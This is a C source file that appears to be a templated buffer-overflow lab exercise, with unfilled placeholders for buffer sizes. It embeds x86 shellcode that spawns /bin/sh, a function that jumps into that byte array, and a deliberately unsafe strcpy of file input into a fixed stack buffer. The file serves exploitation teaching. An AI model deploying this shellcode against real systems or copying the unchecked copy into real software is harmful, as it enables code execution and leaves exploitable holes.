#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char* foo();
int bar(int x);
int execute(char* m_code);

char code[] =
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe1"             /* movl    %esp,%ecx              */
  "\x99"                 /* cdq                            */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

int bof(char *str){
    char buffer[<param_1>];	
    strcpy(buffer, str);
    return 1;
}

int execute(char* m_code){
   ((void(*)( ))m_code)( );
}

char* foo(){
    printf("Inside Foo\n");
    return code;
}

int bar(int x){
    printf("Input Parameter %d\n",x);
    return x+1;
}

int main(int argc, char **argv){
    char str[<param_2> + 1];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    printf("Inside Main\n");
    fread(str, sizeof(char), <param_2>, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}